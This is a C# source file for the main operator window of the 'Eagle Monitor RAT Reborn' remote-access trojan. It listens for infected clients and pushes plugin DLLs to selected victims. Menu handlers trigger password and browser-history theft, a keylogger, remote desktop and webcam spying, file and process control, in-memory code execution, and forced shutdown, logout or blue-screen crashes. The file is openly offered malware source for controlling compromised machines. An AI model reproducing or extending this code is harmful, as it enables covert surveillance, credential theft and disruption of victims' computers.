﻿using EagleMonitor.Config;
using EagleMonitor.Controls;
using EagleMonitor.Forms;
using EagleMonitor.Networking;
using EagleMonitor.Utils;
using Newtonsoft.Json;
using PacketLib;
using PacketLib.Packet;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor
{
    public partial class Main : FormPattern
    {
        private delegate void LoadSettings();
        private delegate string Performance();

        private LoadSettings loadSettings;
        private Performance performance;    

        public Main()
        {
            InitializeComponent();
        }

        private void Settings() 
        {
            dataGridView1.EnableHeadersVisualStyles = false;
            dataGridView1.ClearSelection();
            Directory.CreateDirectory("Logs");
            Directory.CreateDirectory("Clients");
            if (File.Exists(Miscellaneous.GPath + "\\config.json"))
            {
                string json = System.IO.File.ReadAllText(Miscellaneous.GPath + "\\config.json");
                Miscellaneous.settings = JsonConvert.DeserializeObject<Settings>(json);
                label2.Text = "Listening on : { ";
                foreach (int p in Miscellaneous.settings.ports)
                {
                    new Thread(() =>
                    {
                        Server s = new Server();
                        s.Listen(p);
                    }).Start();

                    label2.Text += p.ToString() + ", ";
                }

                label2.Text = label2.Text.Remove(label2.Text.Length - 2, 2);
                label2.Text += " }";
            }
            else 
            {
                Process p = Process.Start("Eagle Monitor Configurator.exe");
                Miscellaneous.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
                p.WaitForExit();
            }

            if (File.Exists(Miscellaneous.GPath + "\\masstasks.json"))
            {
                //TODO
            }
        }
        private void SettingsLoaded(IAsyncResult ar) 
        {
            loadSettings.EndInvoke(ar);
        }

        private string PerformanceCalculator()
        {
            Thread.Sleep(1000);
            return $"CPU {(int)performanceCounter1.NextValue()}%     RAM {(long)performanceCounter2.NextValue()}%";
        }

        private void EndPerformanceCalculator(IAsyncResult ar) 
        {
            Main mainForm = ar.AsyncState as Main;
            mainForm.BeginInvoke((MethodInvoker)(() =>
            {
                labelPerformance.Text = performance.EndInvoke(ar);
            }));
            performance.BeginInvoke(new AsyncCallback(EndPerformanceCalculator), this);
        }

        private void Main_Load(object sender, EventArgs e)
        {
            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(dataGridView1, guna2VScrollBar1, true);
            this.Text = "Eagle Monitor RAT Reborn" + " @Welcome " + Environment.UserName + " !";
            this.label1.Text = "Eagle Monitor RAT Reborn" + " @Welcome " + Environment.UserName + " !";
            //new BlurForm(this);
            Miscellaneous.Enable(this.dataGridView1);
        }

        private void Main_Shown(object sender, EventArgs e)
        {
            loadSettings = new LoadSettings(Settings);
            performance = new Performance(PerformanceCalculator);
            performance.BeginInvoke(new AsyncCallback(EndPerformanceCalculator), this);
            loadSettings.BeginInvoke(new AsyncCallback(SettingsLoaded), this);
        }

        private void dataGridView1_Leave(object sender, EventArgs e)
        {
            dataGridView1.ClearSelection();
            dataGridView1.CurrentCell = null;
        }
        private void Main_MouseLeave(object sender, EventArgs e)
        {
            dataGridView1.ClearSelection();
            dataGridView1.CurrentCell = null;
        }

        //https://stackoverflow.com/questions/4314673/how-to-deselect-all-selected-rows-in-a-datagridview-control
        private void dataGridView1_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DataGridView.HitTestInfo hit = dataGridView1.HitTest(e.X, e.Y);
                if (hit.Type == DataGridViewHitTestType.None)
                {
                    dataGridView1.ClearSelection();
                    dataGridView1.CurrentCell = null;
                }
            }
        }

        private void Main_MouseDown(object sender, MouseEventArgs e)
        {
            dataGridView1.ClearSelection();
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            //TODO : Saves the logs
            Miscellaneous.ToCSV(Program.logForm.dataGridView1);
            Miscellaneous.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void pictureBox2_MouseHover(object sender, EventArgs e)
        {
            pictureBox2.BackColor = Color.FromArgb(55, 55, 55);
        }

        private void pictureBox2_MouseClick(object sender, MouseEventArgs e)
        {
            Process.Start("https://github.com/arsium");
        }

        private void pictureBox2_MouseDown(object sender, MouseEventArgs e)
        {
            pictureBox2.BackColor = Color.FromArgb(60, 60, 60);
        }

        private void pictureBox2_MouseLeave(object sender, EventArgs e)
        {
            pictureBox2.BackColor = Color.FromArgb(45, 45, 45);
        }

        private void pictureBox2_MouseUp(object sender, MouseEventArgs e)
        {
            pictureBox2.BackColor = Color.FromArgb(45, 45, 45);
        }

        private void passwordsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                PasswordsPacket passwordsPacket = new PasswordsPacket
                {
                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
                };
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].passwordsForm != null)
                    { ClientHandler.ClientHandlersList[IP].passwordsForm.Text = "Passwords Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].passwordsForm.label1.Text = "Passwords Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].passwordsForm.Show(); }
                    else
                    {
                        ClientHandler.ClientHandlersList[IP].passwordsForm = new PasswordsForm(ClientHandler.ClientHandlersList[IP])
                        {
                            Text = "Passwords Recovery: " + ClientHandler.ClientHandlersList[IP].HWID
                        }; ClientHandler.ClientHandlersList[IP].passwordsForm.label1.Text = "Passwords Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].passwordsForm.Show(); 
                    }
                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].passwordsForm = new PasswordsForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].passwordsForm.Text = "Passwords Recovery: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].passwordsForm.label1.Text = "Passwords Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].passwordsForm.Show();
                }
                finally
                {
                    ClientHandler.ClientHandlersList[IP].passwordsForm.loadingCircle1.Visible = true;
                    ClientHandler.ClientHandlersList[IP].passwordsForm.loadingCircle1.Active = true;
                    ClientHandler.ClientHandlersList[IP].SendPacket(passwordsPacket);
                }
            }
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                DiskPacket diskPacket = new DiskPacket();
                diskPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1);
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].fileManagerForm != null)
                    { ClientHandler.ClientHandlersList[IP].fileManagerForm.Text = "File Manager: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].fileManagerForm.Show(); }
                    else
                    { ClientHandler.ClientHandlersList[IP].fileManagerForm = new FileManagerForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].fileManagerForm.Text = "File Manager: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].fileManagerForm.Show(); }

                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].fileManagerForm = new FileManagerForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].fileManagerForm.Text = "File Manager: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].fileManagerForm.Show();
                }
                finally 
                {
                    ClientHandler.ClientHandlersList[IP].fileManagerForm.loadingCircle1.Visible = true;
                    ClientHandler.ClientHandlersList[IP].fileManagerForm.loadingCircle1.Active = true;
                    ClientHandler.ClientHandlersList[IP].SendPacket(diskPacket);
                }
            }
        }

        private void processManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ProcessManagerPacket processManagerPacket = new ProcessManagerPacket();
                processManagerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\ProcessManager.dll"), 1);
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].processManagerForm != null)
                    { ClientHandler.ClientHandlersList[IP].processManagerForm.processDataGridView.Rows.Clear(); ClientHandler.ClientHandlersList[IP].processManagerForm.Text = "Process Manager: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].processManagerForm.Show(); }
                    else
                    { ClientHandler.ClientHandlersList[IP].processManagerForm = new ProcessManagerForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].processManagerForm.Text = "Process Manager: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].processManagerForm.Show(); }

                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].processManagerForm = new ProcessManagerForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].processManagerForm.Text = "Process Manager: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].processManagerForm.Show();
                }
                finally 
                {
                    ClientHandler.ClientHandlersList[IP].processManagerForm.loadingCircle1.Visible = true;
                    ClientHandler.ClientHandlersList[IP].processManagerForm.loadingCircle1.Active = true;
                    ClientHandler.ClientHandlersList[IP].SendPacket(processManagerPacket);
                }
            }
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                KeylogPacket keylogPacket = new KeylogPacket();
                keylogPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Keylogger.dll"), 1);
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].keyloggerForm != null)
                    { ClientHandler.ClientHandlersList[IP].keyloggerForm.Text = "Keylogger: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].keyloggerForm.Show(); }
                    else
                    { ClientHandler.ClientHandlersList[IP].keyloggerForm = new KeyloggerForm(IP); ClientHandler.ClientHandlersList[IP].keyloggerForm.Text = "Keylogger: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].keyloggerForm.Show(); }

                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].keyloggerForm = new KeyloggerForm(IP); ClientHandler.ClientHandlersList[IP].keyloggerForm.Text = "Keylogger: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].keyloggerForm.Show();
                }
                finally
                {
                    ClientHandler.ClientHandlersList[IP].SendPacket(keylogPacket);
                }
            }
        }

        private void closeStripMenuItem_Click(object sender, EventArgs e)
        {
            ClosePacket closePacket = new ClosePacket();
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(closePacket);
            }
        }

        private void historyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                HistoryPacket historyPacket = new HistoryPacket
                {
                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
                };
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].historyForm != null)
                    { ClientHandler.ClientHandlersList[IP].historyForm.Text = "History Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].historyForm.label1.Text = "History Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].historyForm.Show(); }
                    else
                    {
                        ClientHandler.ClientHandlersList[IP].historyForm = new HistoryForm(ClientHandler.ClientHandlersList[IP])
                        {
                            Text = "History Recovery: " + ClientHandler.ClientHandlersList[IP].HWID
                        }; ClientHandler.ClientHandlersList[IP].historyForm.label1.Text = "History Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].historyForm.Show();
                    }
                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].historyForm = new HistoryForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].historyForm.Text = "History Recovery: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].historyForm.label1.Text = "History Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].historyForm.Show();
                }
                finally
                {
                    ClientHandler.ClientHandlersList[IP].historyForm.loadingCircle1.Visible = true;
                    ClientHandler.ClientHandlersList[IP].historyForm.loadingCircle1.Active = true;
                    ClientHandler.ClientHandlersList[IP].SendPacket(historyPacket);
                }
            }
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PowerPacket powerPacket = new PowerPacket(PacketType.POWER_SHUTDOWN);
            powerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\PowerManager.dll"), 1);
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(powerPacket);
            }
        }

        private void rebootToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PowerPacket powerPacket = new PowerPacket(PacketType.POWER_REBOOT);
            powerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\PowerManager.dll"), 1);
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(powerPacket);
            }
        }

        private void logOutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PowerPacket powerPacket = new PowerPacket(PacketType.POWER_LOG_OUT);
            powerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\PowerManager.dll"), 1);
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(powerPacket);
            }
        }

        private void bSODToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PowerPacket powerPacket = new PowerPacket(PacketType.POWER_BSOD);
            powerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\PowerManager.dll"), 1);
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(powerPacket);
            }
        }

        private void lockWorkstationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PowerPacket powerPacket = new PowerPacket(PacketType.POWER_LOCK_WORKSTATION);
            powerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\PowerManager.dll"), 1);
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(powerPacket);
            }
        }

        private void hibernateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PowerPacket powerPacket = new PowerPacket(PacketType.POWER_HIBERNATE);
            powerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\PowerManager.dll"), 1);
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(powerPacket);
            }
        }

        private void suspendToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PowerPacket powerPacket = new PowerPacket(PacketType.POWER_SUSPEND);
            powerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\PowerManager.dll"), 1);
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(powerPacket);
            }
        }

        private void miscellaneousPanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].miscellaneousForm != null)
                    { ClientHandler.ClientHandlersList[IP].miscellaneousForm.Text = "Miscellaneous Panel: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].miscellaneousForm.Show(); }
                    else
                    {
                        ClientHandler.ClientHandlersList[IP].miscellaneousForm = new MiscellaneousForm(ClientHandler.ClientHandlersList[IP])
                        {
                            Text = "Miscellaneous Panel: " + ClientHandler.ClientHandlersList[IP].HWID              
                        };ClientHandler.ClientHandlersList[IP].miscellaneousForm.Show();
                    }
                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].miscellaneousForm = new MiscellaneousForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].miscellaneousForm.Show();
                }
            }
        }

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                string HWID = dataGridViewRow.Cells[1].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].remoteDesktopForm != null)
                    { ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Text = "Remote Desktop: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Show(); }
                    else
                    { ClientHandler.ClientHandlersList[IP].remoteDesktopForm = new RemoteDesktopForm(IP, HWID); ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Text = "Remote Desktop: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Show(); }

                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].remoteDesktopForm = new RemoteDesktopForm(IP, HWID); ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Text = "Remote Desktop: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Show();
                }     
            }
        }

        private void remoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].remoteCamera != null)
                    { ClientHandler.ClientHandlersList[IP].remoteCamera.Text = "Remote Webcam: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].remoteCamera.Show(); }
                    else
                    { ClientHandler.ClientHandlersList[IP].remoteCamera = new RemoteCamera(IP); ClientHandler.ClientHandlersList[IP].remoteCamera.Text = "Remote Webcam: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].remoteCamera.Show(); }

                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].remoteCamera = new RemoteCamera(IP); ClientHandler.ClientHandlersList[IP].remoteCamera.Text = "Remote Desktop: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].remoteCamera.Show();
                }
            }
        }

        private void miscealleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].miscellaneousForm != null)
                    { ClientHandler.ClientHandlersList[IP].miscellaneousForm.Text = "Miscellaneous Panel: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].miscellaneousForm.Show(); }
                    else
                    {
                        ClientHandler.ClientHandlersList[IP].miscellaneousForm = new MiscellaneousForm(ClientHandler.ClientHandlersList[IP])
                        {
                            Text = "Miscellaneous Panel: " + ClientHandler.ClientHandlersList[IP].HWID
                        }; ClientHandler.ClientHandlersList[IP].miscellaneousForm.Show();
                    }
                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].miscellaneousForm = new MiscellaneousForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].miscellaneousForm.Show();
                }
            }
        }

        private void massTaskToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (Program.massForm != null)
            {
                Program.massForm.Show();
            }
            else
            {
                Program.massForm = new MassForm();
                Program.massForm.Show();
            }
        }

        private void memoryExecutionToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].memoryExecutionForm != null)
                    { ClientHandler.ClientHandlersList[IP].memoryExecutionForm.Text = "Memory Execution: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].memoryExecutionForm.Show(); }
                    else
                    {
                        ClientHandler.ClientHandlersList[IP].memoryExecutionForm = new MemoryExecutionForm(ClientHandler.ClientHandlersList[IP])
                        {
                            Text = "Memory Execution: " + ClientHandler.ClientHandlersList[IP].HWID
                        }; ClientHandler.ClientHandlersList[IP].memoryExecutionForm.Show();
                    }
                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].memoryExecutionForm = new MemoryExecutionForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].memoryExecutionForm.Show();
                }
            }
        }

        private void informationToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].informationForm != null)
                    { ClientHandler.ClientHandlersList[IP].informationForm.Text = "Information: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].informationForm.Show(); }
                    else
                    { ClientHandler.ClientHandlersList[IP].informationForm = new InformationForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].informationForm.Text = "Information: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].informationForm.Show(); }

                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].informationForm = new InformationForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].informationForm.Text = "Information: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].informationForm.Show();
                }
            }
        }
        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            UninstallPacket uninstallPacket = new UninstallPacket();
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(uninstallPacket);
            }
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new AboutForm().Show();
        }

        private void test123ToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void test456ToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }
    }
}